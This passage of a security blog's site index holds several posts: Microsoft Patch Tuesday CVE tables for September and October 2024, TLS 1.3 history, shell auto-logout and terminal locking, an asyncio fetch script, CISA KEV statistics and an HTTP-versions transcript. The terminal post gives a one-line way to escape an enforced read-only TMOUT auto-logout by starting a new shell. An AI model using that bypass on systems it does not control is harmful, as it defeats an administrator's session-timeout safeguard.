B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-43599 │ B:8.8/T:7.7 │ Remote Desktop Client Remote Code Execution Vulnerability │ │ CVE-2024-43611 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution Vulnerability │ │ CVE-2024-43488 │ B:8.8/T:7.7 │ Visual Studio Code extension for Arduino Remote Code Execution Vulnerability │ └────────────────┴────────────────┴──────────────────────────────────────────────────────────────────────────────────────┘ High_Likelihood/9 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-43502 │ B:7.1/T:6.2 │ Windows Kernel Elevation of Privilege Vulnerability │ │ CVE-2024-43581 │ B:7.1/T:6.2 │ Microsoft OpenSSH for Windows Remote Code Execution Vulnerability │ │ CVE-2024-43609 │ B:6.5/T:5.7 │ Microsoft Office Spoofing Vulnerability │ │ CVE-2024-43615 │ B:7.1/T:6.2 │ Microsoft OpenSSH for Windows Remote Code Execution Vulnerability │ │ CVE-2024-43509 │ B:7.8/T:6.8 │ Windows Graphics Component Elevation of Privilege Vulnerability │ │ CVE-2024-43556 │ B:7.8/T:6.8 │ Windows Graphics Component Elevation of Privilege Vulnerability │ │ CVE-2024-43560 │ B:7.8/T:6.8 │ Microsoft Windows Storage Port Driver Elevation of Privilege Vulnerability │ │ CVE-2024-43583 │ B:7.8/T:6.8 │ Winlogon Elevation of Privilege Vulnerability │ │ CVE-2024-43610 │ B:0.0/T:0.0 │ Copilot Studio Information Disclosure Vulnerability │ └────────────────┴────────────────┴────────────────────────────────────────────────────────────────────────────┘ Exploited_in_Wild/2 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-43573 │ B:6.5/T:6.0 [K] │ Windows MSHTML Platform Spoofing Vulnerability │ │ CVE-2024-43572 │ B:7.8/T:7.2 [K] │ Microsoft Management Console Remote Code Execution Vulnerability │ └────────────────┴─────────────────┴──────────────────────────────────────────────────────────────────┘ [+] Product Families (10) Developer Tools ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 89 Windows ▇▇▇▇▇▇▇▇▇ 28 Microsoft Office ▇▇▇▇▇ 15 ESU ▇▇▇ 10 Azure ▇▇ 8 Mariner ▇▇ 6 System Center ▇ 4 SQL Server ▏ 1 Apps ▏ 1 Browser ▏ 1 [*] \u0026#34;October 2024 Security Updates\u0026#34; (Rev 118) [-] Initial Release date: 2024-10-08T07:00:00 [-] Current Release date: 2024-10-08T07:00:00 [*] [2024-10-09] main(): Completed within [7.2541 sec]. Outro # Tool: Patch_Tuesday at GitHub. Tool: CISA KEV Catalog at GitHub. ","date":"2024-10-09 00:36","externalUrl":null,"permalink":"/posts/2024_oct/","section":"posts","summary":"$ ./patch_tuesday.py -k 2024-oct -vc","title":"Patch Tuesday (2024-10)","type":"posts"},{"content":"","date":"2024-09-27 21:16","externalUrl":null,"permalink":"/tags/disclosure/","section":"tags","summary":"","title":"disclosure","type":"tags"},{"content":"","date":"2024-09-27 21:16","externalUrl":null,"permalink":"/tags/opensource/","section":"tags","summary":"","title":"opensource","type":"tags"},{"content":" There is a link at Microsoft website to disclose any third party componenets that shipped with Microsoft product.\nhttps://3rdpartysource.microsoft.com/ Here, I put in teams to check what it depends on.\nCompliance Inquiry # Will anyone support Microsoft for contributing to open source code with USD 5?\nDownloads # Interestingly, you can access full list by\n$ wget https://3rdpartysource.microsoft.com/downloads. This include the links to all the open source codes.\n","date":"2024-09-27 21:16","externalUrl":null,"permalink":"/posts/3rd_party/","section":"posts","summary":"3rd party disclosures by Microsoft.","title":"Third Party Disclosures","type":"posts"},{"content":"","date":"2024-09-19 00:08","externalUrl":null,"permalink":"/tags/tls/","section":"tags","summary":"","title":"tls","type":"tags"},{"content":" In a nutshell, TLS 1.3 is faster and more secure than TLS 1.2. TLS 1.3 was published by 2018. Since then, it starts replacing the TLS 1.2 (since 2008) and others as the latest standard.\nWhy TLS 1.3? # TLS 1.3 has a faster at TLS handshaking than TLS 1.2. It only requires one round trip (or even zero) instead of two. This will shortening the entire TLS handshaking process.\nIn some cases where client has connected to a website before, the TLS handshake will have zero round trips. This makes the entire HTTPS connection faster by cutting down latency.\nAnother major improvement with TLS 1.3 is stop supporting for those older cryptographic algorithms. As a result, it is more secure than TLS 1.2.\nHistory # 2018 TLS 1.3 RFC 8446: The Transport Layer Security (TLS) Protocol Version 1.3 2008 TLS 1.2 RFC 5246: The Transport Layer Security (TLS) Protocol Version 1.2 2006 TLS 1.1 RFC 4346: The Transport Layer Security (TLS) Protocol Version 1.1 1999 TLS 1.0 RFC 2246: The Transport Layer Security (TLS) Protocol Version 1.0 1996 SSLv3 RFC 6101: The Secure Sockets Layer (SSL) Protocol Version 3.0 (posthumously standardized) 1995 SSLv2 No official RFC. Proprietary protocol developed by Netscape. It was later deprecated due to security flaws. - SSLv1 Proprietary protocol developed by Netscape. It was never made public due to significant security issues. ","date":"2024-09-19 00:08","externalUrl":null,"permalink":"/posts/tls13/","section":"posts","summary":"What is TLS 1.3?","title":"Why TLS 1.3?","type":"posts"},{"content":"","date":"2024-09-13 06:10","externalUrl":null,"permalink":"/tags/cli/","section":"tags","summary":"","title":"cli","type":"tags"},{"content":"","date":"2024-09-13 06:10","externalUrl":null,"permalink":"/categories/essential/","section":"categories","summary":"","title":"Essential","type":"categories"},{"content":" As a security practitional, I can protect my shell login with auto-logout and auto-lock. The Terminal Security Cycle:\nAutologout: to protect system resources. Terminal Lock: to protect from unauthorized access. BASH/KSH/ZSH # To setup auto-logout where after 10 min (7200 seconds) of inactivity at current login:\n$ export TMOUT=7200 To unset or disable the auto-logout feature for current login:\n$ export TMOUT=0 To setup and enforce the auto-logout:\n$ export TMOUT=7200 $ readonly TMOUT $ export TMOUT To bypass the enforcement (by starting another shell instance):\n$ export TMOUT=7200 $ readonly TMOUT $ export TMOUT $ $ exec env TMOUT=0 zsh $ CSH/TCSH # To setup auto-logout where after 10 min of inactivity at current login:\n$ set -r autologout 10 $ ScreenRC # In Linux shell environment, screen is a terminal multiplexer. It allows users to manage multiple terminal sessions within a single window or terminal.\nThere are 2 ways to protect your shell.\nctrl-a+X: To lock the screen session. Set idle 900 in .screenrc file: It will respect the idle timeout and lock the session. Virtual Console Lock # vlock (Virtual Console Lock) is a command-line utility in Linux used to lock one or more virtual consoles (TTYs). This ensures that no one can access the console without providing the correct user password. It is especially useful in multi-user environments where multiple people may have access to the same machine.\nTo lock the current console:\n$ vlock Or, to lock all virtual consoles:\n$ vlock -a This is can be useful to lock ther terminal securely when you step away, just like screen-saver. The terminal remain locked until the cirrect user password is entered.\n","date":"2024-09-13 06:10","externalUrl":null,"permalink":"/posts/protect_terminal/","section":"posts","summary":"Protect our terminal shell login.","title":"Protect Your Terminal","type":"posts"},{"content":"","date":"2024-09-13 06:10","externalUrl":null,"permalink":"/tags/shell/","section":"tags","summary":"","title":"shell","type":"tags"},{"content":" This video summarizes the security updates released by Microsoft on September 10, 2024. Key Takeways # Highest scored vulnerability is 9.8, average score is 7.70. Sign up for full briefing call if you are a Microsoft Premier or unified support customer.\n79 newly disclosed vulnerabilities in September 2024 release (slightly higher than average). 23 remote code execution vulnerabilities (most impactful type). Highest CVSS scored vulnerability is 9.8. 7 ciritcal patches (lower than last month). Critical vulnerabilities include CVE-2024-38063 (TCP/IP stack) and CVE-2024-3819 (line printer daemon). Accelerate update deployment due to elevated risk. Total of 78 CVEs that require customer action. (New metric starting in Aug 2024) Total of 4 CVEs found in CISA_KEV and exploited in wild. Highlights # CVE-2024-38018: This vulnerability impacts SharePoint servers, enabling remote code execution with low complexity. It\u0026rsquo;s crucial for organizations running their own SharePoint servers to apply the necessary patches. CVE-2024-38217: This exploit allows attackers to bypass the Mark of the Web security feature, potentially leading to the download and execution of malicious files. It\u0026rsquo;s recommended to patch this vulnerability to protect users from downloading harmful content. CVE-2024-43491: A critical vulnerability affecting older Windows versions (1507 and 10 2015 LTSB) was reintroduced due to a rollback of security updates. This allows attackers to exploit previously patched vulnerabilities and gain control of the system. Video is added later since it only been released on Sep 12.\nPatch_Tuesday # $ ./patch_tuesday.py -k 2024-sep -vc _____ _ _ _____ _ | _ |___| |_ ___| |_ |_ _|_ _ ___ ___ _| |___ _ _ | __| .\u0026#39;| _| _| | | | | | | -_|_ -| . | .\u0026#39;| | | |__| |__,|_| |___|_|_| |_| |___|___|___|___|__,|_ | |___| [*] Finish fetching [2,383,180 bytes] from https://api.msrc.microsoft.com/cvrf/v3.0/cvrf/2024-sep [*] CISA Catalog of Known Exploited Vulnerabilities [ 2024.09.11/1169 ] Microsoft Patch Tuesday - By MSRC =============================================== \u0026lt;\u0026lt; September 2024 Security Updates [ 2024-09-10 ] \u0026gt;\u0026gt; [+] Vulnerabilities : [ 79 ] [-] High_Severity : [ 19 ] [-] High_likelihood : [ 19 ] [-] Exploited in_wild : [ 4 ] [-] Action_required : [ 78 ] [-] Found in CISA_KEV : [ 4 ] High_Severity/19 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-37338 │ B:8.8/T:7.7 │ Microsoft SQL Server Native Scoring Remote Code Execution Vulnerability │ │ CVE-2024-37335 │ B:8.8/T:7.7 │ Microsoft SQL Server Native Scoring Remote Code Execution Vulnerability │ │ CVE-2024-37340 │ B:8.8/T:7.7 │ Microsoft SQL Server Native Scoring Remote Code Execution Vulnerability │ │ CVE-2024-37339 │ B:8.8/T:7.7 │ Microsoft SQL Server Native Scoring Remote Code Execution Vulnerability │ │ CVE-2024-26186 │ B:8.8/T:7.7 │ Microsoft SQL Server Native Scoring Remote Code Execution Vulnerability │ │ CVE-2024-26191 │ B:8.8/T:7.7 │ Microsoft SQL Server Native Scoring Remote Code Execution Vulnerability │ │ CVE-2024-38018 │ B:8.8/T:7.7 │ Microsoft SharePoint Server Remote Code Execution Vulnerability │ │ CVE-2024-38220 │ B:9.0/T:7.8 │ Azure Stack Hub Elevation of Privilege Vulnerability │ │ CVE-2024-37965 │ B:8.8/T:7.7 │ Microsoft SQL Server Elevation of Privilege Vulnerability │ │ CVE-2024-37341 │ B:8.8/T:7.7 │ Microsoft SQL Server Elevation of Privilege Vulnerability │ │ CVE-2024-38225 │ B:8.8/T:7.7 │ Microsoft Dynamics 365 Business Central Elevation of Privilege Vulnerability │ │ CVE-2024-38259 │ B:8.8/T:7.7 │ Microsoft Management Console Remote Code Execution Vulnerability │ │ CVE-2024-38260 │ B:8.8/T:7.7 │ Windows Remote Desktop Licensing Service Remote Code Execution Vulnerability │ │ CVE-2024-43455 │ B:8.8/T:7.7 │ Windows Remote Desktop Licensing Service Spoofing Vulnerability │ │ CVE-2024-43461 │ B:8.8/T:7.7 │ Windows MSHTML Platform Spoofing Vulnerability │ │ CVE-2024-43469 │ B:8.8/T:7.7 │ Azure CycleCloud Remote Code Execution Vulnerability │ │ CVE-2024-43479 │ B:8.5/T:7.4 │ Microsoft Power Automate Desktop Remote Code Execution Vulnerability │ │ CVE-2024-43491 │ B:9.8/T:9.1 [K] │ Microsoft Windows Update Remote Code Execution Vulnerability │ │ CVE-2024-37980 │ B:8.8/T:7.7 │ Microsoft SQL Server Elevation of Privilege Vulnerability │ └────────────────┴─────────────────┴──────────────────────────────────────────────────────────────────────────────┘ High_Likelihood/19 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-38018 │ B:8.8/T:7.7 │ Microsoft SharePoint Server Remote Code Execution Vulnerability │ │ CVE-2024-38241 │ B:7.8/T:6.8 │ Kernel Streaming Service Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38242 │ B:7.8/T:6.8 │ Kernel Streaming Service Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38249 │ B:7.8/T:6.8 │ Windows Graphics Component Elevation of Privilege Vulnerability │ │ CVE-2024-38252 │ B:7.8/T:6.8 │ Windows Win32 Kernel Subsystem Elevation of Privilege Vulnerability │ │ CVE-2024-38253 │ B:7.8/T:6.8 │ Windows Win32 Kernel Subsystem Elevation of Privilege Vulnerability │ │ CVE-2024-43464 │ B:7.2/T:6.3 │ Microsoft SharePoint Server Remote Code Execution Vulnerability │ │ CVE-2024-38227 │ B:7.2/T:6.3 │ Microsoft SharePoint Server Remote Code Execution Vulnerability │ │ CVE-2024-38228 │ B:7.2/T:6.3 │ Microsoft SharePoint Server Remote Code Execution Vulnerability │ │ CVE-2024-38237 │ B:7.8/T:6.8 │ Kernel Streaming WOW Thunk Service Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38238 │ B:7.8/T:6.8 │ Kernel Streaming Service Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38243 │ B:7.8/T:6.8 │ Kernel Streaming Service Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38244 │ B:7.8/T:6.8 │ Kernel Streaming Service Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38245 │ B:7.8/T:6.8 │ Kernel Streaming Service Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38246 │ B:7.0/T:6.1 │ Win32k Elevation of Privilege Vulnerability │ │ CVE-2024-38247 │ B:7.8/T:6.8 │ Windows Graphics Component Elevation of Privilege Vulnerability │ │ CVE-2024-43457 │ B:7.8/T:6.8 │ Windows Setup and Deployment Elevation of Privilege Vulnerability │ │ CVE-2024-43461 │ B:8.8/T:7.7 │ Windows MSHTML Platform Spoofing Vulnerability │ │ CVE-2024-43487 │ B:6.5/T:6.0 │ Windows Mark of the Web Security Feature Bypass Vulnerability │ └────────────────┴────────────────┴────────────────────────────────────────────────────────────────────────────────┘ Exploited_in_Wild/4 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-38014 │ B:7.8/T:7.2 [K] │ Windows Installer Elevation of Privilege Vulnerability │ │ CVE-2024-38217 │ B:5.4/T:5.0 [K] │ Windows Mark of the Web Security Feature Bypass Vulnerability │ │ CVE-2024-38226 │ B:7.3/T:6.8 [K] │ Microsoft Publisher Security Feature Bypass Vulnerability │ │ CVE-2024-43491 │ B:9.8/T:9.1 [K] │ Microsoft Windows Update Remote Code Execution Vulnerability │ └────────────────┴─────────────────┴───────────────────────────────────────────────────────────────┘ [+] Product Families (6) Windows ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 28 Microsoft Office ▇▇▇▇▇▇▇▇▇▇▇ 21 Azure ▇▇▇▇▇▇▇▇▇▇▇ 20 ESU ▇▇▇▇▇ 10 SQL Server ▇▇▇▇ 8 Microsoft Dynamics ▇▇▇ 5 [*] \u0026#34;September 2024 Security Updates\u0026#34; (Rev 141) [-] Initial Release date: 2024-09-10T07:00:00 [-] Current Release date: 2024-09-08T00:00:00 [*] [2024-09-11] main(): Completed within [7.7629 sec]. Outro # Tool: Patch_Tuesday at GitHub. Tool: CISA KEV Catalog at GitHub. ","date":"2024-09-11 17:36","externalUrl":null,"permalink":"/posts/2024_sep/","section":"posts","summary":"$ ./patch_tuesday.py -k 2024-sep -vc","title":"Patch Tuesday (2024-09)","type":"posts"},{"content":"","date":"2024-09-09 18:35","externalUrl":null,"permalink":"/tags/async/","section":"tags","summary":"","title":"async","type":"tags"},{"content":"","date":"2024-09-09 18:35","externalUrl":null,"permalink":"/series/asyncio/","section":"series","summary":"","title":"AsyncIO","type":"series"},{"content":" Here\u0026rsquo;s a practical example to show how to fetch multiple pages of JSON from an API.\nIt can retries if there is HTTP request (network) error or hitting rate limitation.\nPseudo Code # The code snippets here combine the following:\nFetches pages asynchronously with asyncio. Uses HTTP/2 instead of HTTP/1.1 with httpx module. Uses HTTP connection pooling (with client()) for better efficiency in using of network resources. It will reuse the underlying TCP connection instead of recreating one for every request. Uses semaphore to limit the conncurrent connections at a time. Retries the fetching (via recursive call) if there is network error (HTTPRequestError). Delay and retries the fetching (via recursive call) if there is rate limit error (HTTPStatusError 429). Track the progress and % of successful fetched pages. Once completed, it will check status code (in the HTTP response) to ensure all pages are return correctly (HTTP 200). Code Snippets # #!/usr/bin/env python3 # -*- coding: utf-8 -*- from rich import print as rprint import httpx import asyncio http200 = 0 retries = 0 pages = 0 def try_again(headers): try: return int(headers.get(\u0026#39;Retry-After\u0026#39;,0)) except ValueError: return None async def fetching(client,url,sem): global http200 global retries global pages backoff = 0.2 total = pages try: async with sem: resp = await client.get(url) resp.raise_for_status() except httpx.RequestError: await asyncio.sleep(backoff) return await fetching(client,url,sem) # Return the result of the retry except httpx.HTTPStatusError as err: if err.response.status_code == 429: retry_after = try_again(err.response.headers) if retry_after: rprint(f\u0026#39; [-] Rate limit reached for {url}. Waiting {retry_after} before retry...\u0026#39;) await asyncio.sleep(retry_after + backoff) else: rprint(f\u0026#39; [-] Waiting {backoff} before retry...\u0026#39;) await asyncio.sleep(backoff) retries += 1 backoff *= 2 return await fetching(client,url,sem) # Return the result of the retry else: rprint(f\u0026#39; [!] [{resp.status_code}] {url}\u0026#39;) else: if resp and resp.status_code == 200: http200 += 1 rprint(f\u0026#39; [[green]{resp.status_code}[/green]] [ [magenta]{http200}/{total}[/magenta] ({http200/total*100:.2f}%) ]\u0026#39;) return resp async def main(links): limit = 5 sem = asyncio.Semaphore(limit) hdrs = { \u0026#39;accept\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39; } async with httpx.AsyncClient(headers=hdrs, http2=True) as client: tasks = [ fetching(client,link,sem) for link in links ] responses = await asyncio.gather(*tasks) print(f\u0026#39;\u0026#39;) fail = 1 if any(r is None or r.status_code != 200 for r in responses) else 0 if not fail: print(f\u0026#39;All [{len(responses)} responses] are OK.\u0026#39;) print(responses) else: print(f\u0026#39;Errors: Not all {responses} are OK.\u0026#39;) links = [] # A list that contains long list of URL to be fetched. asyncio.run(main(links)) ","date":"2024-09-09 18:35","externalUrl":null,"permalink":"/posts/asyncio/fetching/","section":"posts","summary":"A practical example to fetch multiple pages with retries (using recursive).","title":"Fetching with Retries","type":"posts"},{"content":"","date":"2024-09-09 18:35","externalUrl":null,"permalink":"/tags/http/","section":"tags","summary":"","title":"http","type":"tags"},{"content":"","date":"2024-09-09 18:07","externalUrl":null,"permalink":"/tags/ai/","section":"tags","summary":"","title":"ai","type":"tags"},{"content":" Three competencies, which are the backbone of building an IRREPLACEABLE future for you, your children, and your business. I took a quiz on How well can I succeed in the age of Artificial Intelligence? today. And I recommend everyone should take the IRREPLACEABLE Quotient (IRQ) Test.\nThe Quiz # I\u0026rsquo;m getting a score of 10/15 (~66%) at the first round. Below here are my results:\nIn the age of AI, building a deep technical expertise offers more security than developing a more shallow and varied skill set. [T/F] Allowing ChatGPT at school would diminish students\u0026rsquo; critical thinking skills. [T/F] As the presence of technology increases, we should focus on learning coding and programming, as these skills will become more valuable than others like creativity or empathy. [T/F] Practicing open-mindedness has large impact on your ability to work effectively with AI. [T/F] Knowing about 30% of a wide range of AI topics is better than knowing 100% of a few AI topics. [T/F] You can become more resilient by learning how to reject your negative emotions. [T/F] Comfort with discomfort is a skill for adapting to rapid changes in technology. [T/F] Skepticism towards new technologies boosts innovation and adaptability in the workplace. [T/F] Unlearning outdated knowledge is as important as learning new information. [T/F] Personal data privacy is less of a concern when using AI tools from established companies. [T/F] Developing AI literacy is worth doing, because it is a one-time investment that requires minimum updating. [T/F] In a future where data-driven decisions are automated, the need for critical thinking decreases, leaving us more time for creativity. [T/F] As AI becomes more prevalent, Emotional Intelligence (EQ) will become more crucial than Intelligence Quotient (IQ). [T/F] Navigating ambiguity will become a less necessary skill due to the increased capacity of AI to predict the future. [T/F] As our world becomes more digital, empathy will play a less significant role. [T/F] The score (10/15) is broken down into the three (3) competencies, which are the backbone of building an IRREPLACEABLE future.\n3 Competencies # According to IRREPLACEABLE, there are three (3) essential competencies to pose in order to become IRREPLACEABLE in the age of AI.\n1. Change-Ready # Change-Ready means having the resilience and adaptability to thrive in a world that is evolving at an increasing pace. It\u0026rsquo;s about being able to learn, unlearn, and relearn as the situation demands.\nA Change-Ready individual is proactive, flexible, and always looking for ways to improve. They see change as an opportunity, not a threat, and are willing to take risks and experiment with new ideas.\n2. AI-Ready # AI-Ready means having a deep understanding of AI technologies, their capabilities, and their limitations. It\u0026rsquo;s about knowing how to leverage AI to augment our own abilities and make better decisions.\nAI-Ready involves also safeguarding against its negative impacts, such as ethical issues or addictions. It\u0026rsquo;s also about having the right mindset: seeing AI as a tool to be harnessed, not a threat to be feared.\n3. Human-Ready # Human-Ready means cultivating the Humics, which are the uniquely human abilities that AI cannot replicate authentically: genuine creativity, social authenticity, and critical thinking. It\u0026rsquo;s about recognizing that our value lies not in our ability to process information, but in our ability to create, innovate, and connect with others on a deep, emotional level.\nA Human-Ready individual is self-aware, emotionally intelligent, and able to collaborate effectively with both humans and machines.\nLinks # IRREPLACEABLE ","date":"2024-09-09 18:07","externalUrl":null,"permalink":"/notes/irreplaceable/","section":"notes","summary":"Three competencies to pose to become \u003ccode\u003eirreplaceable\u003c/code\u003e.","title":"Irreplaceable Quotient","type":"notes"},{"content":"","date":"2024-09-09 18:07","externalUrl":null,"permalink":"/tags/quiz/","section":"tags","summary":"","title":"quiz","type":"tags"},{"content":" CISA KEV has been released 34 months. Today, there are total of 1159 (+33) CVE been added to CISA KEV catalog.\nCISA Catalog of Known Exploited Vulnerabilities [ 2024.08.28/1159 ]\nUpdates # As of today, there are total of 1143 CVE have overdue, and another 16 will due in Sep 2024.\nHighlights (within CISA KEV catalog):\nThe top-5 vendors with highest number of vulnerabilities remain the same (total 184 vendors). The top-5 vendors hold 573 (around 49%) of all the 1159 CVEs. The top-5 vulnerable products remain the same (total 475 products). There are 252 (or ~22%) CVE found at the top-5 vulnerable products. One difference is, Chromium V8 (32) has overtook Internet Explorer (32) as the third position in top-vulnerable products. The mean value increases to 96.58 (was 93.83). The top-5 months where distribution of KEV is higher than mean remain the same (Mar, Apr, May Jun, Nov). Current State # Microsoft Apple Cisco Adobe Google others 298 75 72 68 60 586 Windows Multiple Products (Apple) Chromium V8 Internet Explorer Flash Player others 121 38 32 32 29 907 mean_val=96.58333333333333\nJan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec 28 32 132 164 241 160 70 59 63 45 125 40 ","date":"2024-09-01 09:28","externalUrl":null,"permalink":"/posts/cisa_kev_34m/","section":"posts","summary":"Analysis updates of CISA KEV catalog.","title":"34-Month Update with CISA KEV","type":"posts"},{"content":" Amazing animation in explaining the differences among HTTP versions, 1, 1.1, 2.0 and 3.0. HTTP Version Evolution # In case you haven\u0026rsquo;t know, I\u0026rsquo;ve posted about HTTP Versioning last year.\nHTTP Versioning 2023-03-21 16:34\u0026middot;740 words\u0026middot;4 mins Posts async cli http python tools HTTP/1 vs HTTP/1.1 vs HTTP/2 vs HTTP/3 Below is the video at Youtube, shared by ByteByteGo.\nTranscript # Here, I also include the full transcript for reference.\nToday we\u0026rsquo;re diving into the fascinating world of HTTP. It\u0026rsquo;s the backbone of the web.\nWe explore how it evolved from HTTP 1, to 2 and then to 3. Get ready for an interesting ride.\nHTTP stands for hypertext transfer protocol. It is how browsers talk to web servers. They ask for web pages and get them back.\nAt first, HTTP was for hypertext documents. These are documents with links to other documents but developers soon found HTTP could send imag and videos too.\nNow it\u0026rsquo;s also used for APIs, file transfers and a wide range of web-based services.\nLet\u0026rsquo;s go back to 1996.\nThat\u0026rsquo;s when HTTP 1 was introduced but before that, there was HTTP 0.9.\nIt was simple. It only supported GET and had no headers. It only sent HTML files there where no HTTP headers or status codes.\nHTTP 1.0 added headers status codes and new methods that POST and HEAD. It was straightforward the browser would ask for a web page the server would send it.\nEach request needed its own connection. This means a lot of back and forth.\nIt wasn\u0026rsquo;t very efficient. This is why. First there\u0026rsquo;s a TCP handshake which is a 3-way process to start a connection. Then for HTTPS there\u0026rsquo;s a TLS handshake for security.\nThis all happens before any data is sent with HTTP 1.\nThis happened for every resource. Every image, CSS file, or JavaScript file. Not ideal right?\nIn 1997, HTTP 1.1 came out. It fixed problems with http 1.\nIt\u0026rsquo;s still used a lot today even after 25 years.\nWhy? It has some great new features.\nHTTP 1.1 introduced persistent connections. The connections stay open unless to close.\nThis meant no more closing after every request. No more multiple TCP handshakes.\nIt got rid of the extra work of constantly opening and closing connections.\nIt also introduced pipelining. This allows clients send multiple requests over one TCP connection. They didn\u0026rsquo;t have to wait for responses.\nFor example, when a browser needs two images, he can request them one after the other. This made things faster by reduced the wait time for each response.\nAnother key feature was chunk transfer encoding.\nServers could send responses in smaller chunks. They didn\u0026rsquo;t have to wait for the whole response to be ready.\nThis may initial page rendering faster. It improved user experience especially for large or dynamic content.\nHTTP 1.1 also brought better caching and conditional requests. It added headers like cache control and ETag. These help manage cache content and reduce unnecessary data transfers.\nConditional request using headers like If-Modify-Since, let clients request resources only if they changed. This save bandwidth and improved performance.\nBut websites grew bigger and more complex, the this showed a big problem with HTTP 1.1 had a line blocking.\nIf the first request in the pipeline was delayed, all the others had to wait. Because of this and other issues, many browsers didn\u0026rsquo;t use pipelining.\nDevelopers found ways around these limits.\nOne was domain Sharding. Websites would serve static asset from subdomains. Each new subdomain got 6 more connections.\nAnother trick was to make fewer requests by bundling assess. Images would be combined using Sprites CSS and JavaScript files would be concatenated.\nIn 2015, HTTP 2 arrived.\nIt was designed to fix HTTP 1\u0026rsquo;s performance problems. It brought major improvements.\nHTTP 2 introduced a binary framing layer. Unlike HTTP 1\u0026rsquo;s plain text messages, HTTP 2 uses binary format.\nMessages are divided into smaller units called frames. These are sent over the TCP connection. The binary framing layer handles all these.\nHTTP 2 also brought full request and response multiplexing. Clients and servers can break down HTTP messages into independent frames. These can be mixed during transmission and put back together on the other side. This fixed the Head-of-line Blocking problem from HTTP 1.\nStream prioritization was another key in HTTP 2 feature. The order of loading assets matters for web pages.\nStream prioritization lets developers set the importance of requests. The browser can tell the server which asset of high priority. The server then sends more frames for these important requests.\nHTTP 2 also supports server PUSH. HTTP 2 allows multiple responses to client\u0026rsquo;s request.\nA server can send extra resources along with the requested HTML page. It is like giving the client a resource before they even ask for it.\nLastly, HTTP 2 introduces header compression. In HTTP 1, only the main data was compressed. Headers were sent as plain text.\nHTTP 2 uses HPack to make headers smaller. HPack compresses headers and remembers past headers. It uses this info to compress future headers even more. But as web apps got more complex and mobile, Internet became common, HTTP 2 shows some limits.\nTCP\u0026rsquo;s nature is handling of packet loss. And head outline blocking caused lower page lows. This was especially true on high latency or lossy networks.\nThis led to HTTP 3 standardizing in 2022.\nHTTP 3 used QUIC instead of TCP. QUIC was developed by Google. It was built on UDP, a connectionless protocol.\nUDP doesn\u0026rsquo;t need to set up a connection before sending data. QUIC and HTTP 3 have some big advantages. They reduce latency. They improve multiplexing without TCP head outline blocking. They handle packet loss better. They perform better on mobile networks with seamless connection changes.\nWhen a client connects to a server with HTTP 3, it starts a QUIC handshake. QUIC combines with TLS 1.3 for security.\nThe TLS handshake happens during the QUIC connection setup. This reduces the overall latency.\nHTTP 3 sets up connections faster than TCP. If the client and server have talked before, QUIC can secure the connection in 1 round trip. Sometimes it can do it in 0-round-trip.\nIn 0-RT, the client sends a request right away. The server process it without a full handshake.\nHTTP 3 also handles network changes well. If you switch from Wi-Fi to cellular on your phone, HTTP 3 can keep the connection going. This is thanks to QUIC connection IDs. These don\u0026rsquo;t depend on IP addresses.\nAs of 2023 HTTP 1.1 is still widely used especially for simple websites.\nHTTP 2 has been adopted a lot. It handles over 